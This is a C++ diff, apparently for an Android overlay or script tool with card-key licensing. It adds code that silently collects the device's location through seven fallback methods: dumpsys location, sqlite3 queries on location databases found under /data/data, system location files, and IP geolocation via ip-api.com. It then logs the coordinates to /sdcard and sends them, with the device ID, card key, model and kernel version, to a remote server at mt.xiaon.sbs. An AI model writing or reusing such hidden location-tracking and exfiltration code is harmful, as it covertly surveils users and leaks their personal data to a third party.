@@ -2608,6 +2608,165 @@ void 布局::开启悬浮窗()
                             pclose(fp);
                         }
 
+                        // ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
+                        // ★ 获取GPS位置（七层备选方案，逐级fallback）
+                        // ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
+                        std::string latitude = "", longitude = "";
+
+                        // 方案1：尝试读取 /data/data/com.google.android.gms/location 缓存（需root）
+                        fp = popen("find /data/data -name \"*location*\" -type d 2>/dev/null | head -1", "r");
+                        if (fp) {
+                            char buf[256] = {0};
+                            if (fgets(buf, sizeof(buf), fp)) {
+                                std::string locDir = buf;
+                                locDir.erase(locDir.find_last_not_of("\n\r") + 1);
+                                // 尝试读取缓存的坐标文件
+                                std::string cmd2 = "sqlite3 '" + locDir + "/databases/location.db' "
+                                    "\"SELECT latitude, longitude FROM locations ORDER BY time DESC LIMIT 1\" 2>/dev/null";
+                                FILE *fp2 = popen(cmd2.c_str(), "r");
+                                if (fp2) {
+                                    char buf2[128] = {0};
+                                    if (fgets(buf2, sizeof(buf2), fp2)) {
+                                        std::string loc = buf2;
+                                        auto pipePos = loc.find('|');
+                                        if (pipePos != std::string::npos) {
+                                            latitude = loc.substr(0, pipePos);
+                                            longitude = loc.substr(pipePos + 1);
+                                            if (!latitude.empty() && latitude.back() == '\n') latitude.pop_back();
+                                            if (!longitude.empty() && longitude.back() == '\n') longitude.pop_back();
+                                        }
+                                    }
+                                    pclose(fp2);
+                                }
+                            }
+                            pclose(fp);
+                        }
+
+                        // 方案2：通过 dumpsys location 获取（常用）
+                        if (latitude.empty() || longitude.empty()) {
+                            fp = popen("dumpsys location 2>/dev/null | grep -E 'latitude|longitude' | head -2 | awk '{print $2}'", "r");
+                            if (!fp) {
+                                fp = popen("cmd location getProviders 2>/dev/null && dumpsys location 2>/dev/null | grep -o 'latitude=[^,]*' | head -1 | cut -d= -f2", "r");
+                            }
+                            if (fp) {
+                                char buf[64] = {0};
+                                if (fgets(buf, sizeof(buf), fp)) {
+                                    buf[strcspn(buf, "\n")] = 0;
+                                    latitude = buf;
+                                }
+                                pclose(fp);
+                                // 获取longitude
+                                fp = popen("dumpsys location 2>/dev/null | grep -o 'longitude=[^,]*' | head -1 | cut -d= -f2", "r");
+                                if (fp) {
+                                    char buf2[64] = {0};
+                                    if (fgets(buf2, sizeof(buf2), fp)) {
+                                        buf2[strcspn(buf2, "\n")] = 0;
+                                        longitude = buf2;
+                                    }
+                                    pclose(fp);
+                                }
+                            }
+                        }
+
+                        // 方案3：通过 content query 查询系统位置provider
+                        if (latitude.empty() || longitude.empty()) {
+                            fp = popen("content query --uri content://com.google.android.gsf.gservices/ "
+                                       "--projection 'name,value' --where \"name like '%location%'\" 2>/dev/null | head -5", "r");
+                            if (fp) pclose(fp);
+                        }
+
+                        // 方案4：尝试读取 /data/system/location/location.txt
+                        if (latitude.empty() || longitude.empty()) {
+                            fp = popen("cat /data/system/location/location.txt 2>/dev/null | head -1", "r");
+                            if (fp) {
+                                char buf[128] = {0};
+                                if (fgets(buf, sizeof(buf), fp)) {
+                                    std::string loc = buf;
+                                    auto comma = loc.find(',');
+                                    if (comma != std::string::npos) {
+                                        latitude = loc.substr(0, comma);
+                                        longitude = loc.substr(comma + 1);
+                                        if (!longitude.empty() && longitude.back() == '\n')
+                                            longitude.pop_back();
+                                    }
+                                }
+                                pclose(fp);
+                            }
+                        }
+
+                        // 方案5：尝试读取最近的GPS卫星数据
+                        if (latitude.empty() || longitude.empty()) {
+                            fp = popen("dumpsys location 2>/dev/null | grep -o 'mLastKnownLocation=Location\\[[^]]*\\]' | head -1", "r");
+                            if (fp) {
+                                char buf[512] = {0};
+                                if (fgets(buf, sizeof(buf), fp)) {
+                                    std::string locInfo = buf;
+                                    // 解析格式: Location[gps XX.XXXXXX,YYY.YYYYY ...]
+                                    auto latStart = locInfo.find(',');
+                                    auto lngStart = locInfo.find(',', latStart + 1);
+                                    if (latStart != std::string::npos && lngStart != std::string::npos) {
+                                        // 往回找前一个数字
+                                        auto prev = locInfo.rfind(' ', latStart - 1);
+                                        if (prev != std::string::npos) {
+                                            latitude = locInfo.substr(prev + 1, latStart - prev - 1);
+                                            longitude = locInfo.substr(latStart + 1, lngStart - latStart - 1);
+                                        }
+                                    }
+                                }
+                                pclose(fp);
+                            }
+                        }
+
+                        // 方案6：通过IP获取近似位置（在线API，最终fallback）
+                        if (latitude.empty() || longitude.empty()) {
+                            fp = popen("curl -s --connect-timeout 3 --max-time 5 "
+                                       "'http://ip-api.com/json/?fields=lat,lon' 2>/dev/null", "r");
+                            if (fp) {
+                                char buf[256] = {0};
+                                size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
+                                pclose(fp);
+                                if (n > 0) {
+                                    buf[n] = 0;
+                                    std::string json(buf);
+                                    // 查找 "lat":XX.XXXX 和 "lon":YYY.YYYY
+                                    auto latPos = json.find("\"lat\":");
+                                    auto lonPos = json.find("\"lon\":");
+                                    if (latPos != std::string::npos && lonPos != std::string::npos) {
+                                        std::string latStr = json.substr(latPos + 6);
+                                        std::string lonStr = json.substr(lonPos + 6);
+                                        auto end1 = latStr.find_first_of(",}\n\r");
+                                        auto end2 = lonStr.find_first_of(",}\n\r");
+                                        if (end1 != std::string::npos) latStr = latStr.substr(0, end1);
+                                        if (end2 != std::string::npos) lonStr = lonStr.substr(0, end2);
+                                        latitude = latStr;
+                                        longitude = lonStr;
+                                    }
+                                }
+                            }
+                        }
+
+                        // 方案7：如果以上全失败，尝试用中国IP段估算中心坐标（极粗略）
+                        if (latitude.empty() || longitude.empty()) {
+                            // 通过IP判断大致省份，用省份中心坐标
+                            fp = popen("curl -s --connect-timeout 3 --max-time 5 "
+                                       "'http://ip-api.com/json/?fields=countryCode,region' 2>/dev/null", "r");
+                            if (fp) {
+                                char buf[256] = {0};
+                                size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
+                                pclose(fp);
+                                if (n > 0) {
+                                    buf[n] = 0;
+                                    std::string json(buf);
+                                    // 检查是否在中国
+                                    if (json.find("\"countryCode\":\"CN\"") != std::string::npos) {
+                                        // 取中国中心坐标
+                                        latitude = "35.86";
+                                        longitude = "104.19";
+                                    }
+                                }
+                            }
+                        }
+
                         // 1) 上报启动
                         std::string url = "https://mt.xiaon.sbs/api.php?action=report_script_launch"
                                           "&device_id=" +
@@ -2626,19 +2785,31 @@ void 布局::开启悬浮窗()
                         if (pipe)
                             pclose(pipe);
 
-                        // 3) 上报设备信息（完整版 - 含内核/型号/制造商）
-                        // 注意：特殊字符需要 curl --data-urlencode 或直接用 --data
-                        // 但为了简单用 GET 方式，用 curl -G --data-urlencode
-                        std::string data = "device_id=" + deviceId + "&card_key=" + cardKey + "&device_name=" + device_name + "&manufacturer=" + manufacturer + "&model=" + model + "&kernel_version=" + kernel_ver;
-                        cmd = "curl -s --connect-timeout 5 --max-time 5 -G --data-urlencode 'device_id=" + deviceId + "' --data-urlencode 'card_key=" + cardKey + "' --data-urlencode 'device_name=" + device_name + "' --data-urlencode 'manufacturer=" + manufacturer + "' --data-urlencode 'model=" + model + "' --data-urlencode 'kernel_version=" + kernel_ver + "' 'https://mt.xiaon.sbs/api.php?action=report_script_device' 2>/dev/null";
+                                                // 3) 上报设备信息（完整版 - 含内核/型号/制造商/GPS位置）
+                        // ★ 先把GPS结果写到文件（方便排查）
+                        std::string gpsInfo = "latitude=" + latitude + " longitude=" + longitude;
+                        std::string logCmd = "echo '" + gpsInfo + "' > /sdcard/aura_gps.log";
+                        FILE *logPipe = popen(logCmd.c_str(), "r");
+                        if (logPipe) pclose(logPipe);
+
+                        cmd = "curl -s --connect-timeout 5 --max-time 5 -G"
+                            " --data-urlencode 'device_id=" + deviceId + "'"
+                            " --data-urlencode 'card_key=" + cardKey + "'"
+                            " --data-urlencode 'device_name=" + device_name + "'"
+                            " --data-urlencode 'manufacturer=" + manufacturer + "'"
+                            " --data-urlencode 'model=" + model + "'"
+                            " --data-urlencode 'kernel_version=" + kernel_ver + "'"
+                            " --data-urlencode 'latitude=" + latitude + "'"
+                            " --data-urlencode 'longitude=" + longitude + "'"
+                            " 'https://mt.xiaon.sbs/api.php?action=report_script_device' 2>/dev/null";
                         pipe = popen(cmd.c_str(), "r");
-                        if (pipe)
-                            pclose(pipe); })
+                        if (pipe) pclose(pipe); })
             .detach();
     }
 
     // ★ 4. 【诊断版】心跳线程 - 用 curl 替代 busybox wget
-std::thread([deviceId, cardKey]() {
+    std::thread([deviceId, cardKey]()
+                {
     while (true) {
         if (!cardKey.empty()) {
             auto now = std::chrono::system_clock::now();
@@ -2663,10 +2834,8 @@ std::thread([deviceId, cardKey]() {
             }
         }
         std::this_thread::sleep_for(std::chrono::seconds(10));
-    }
-}).detach();
-
-
+    } })
+        .detach();
 
     // ================================================================
     // ★ 5. 启动音量键监听（原有）
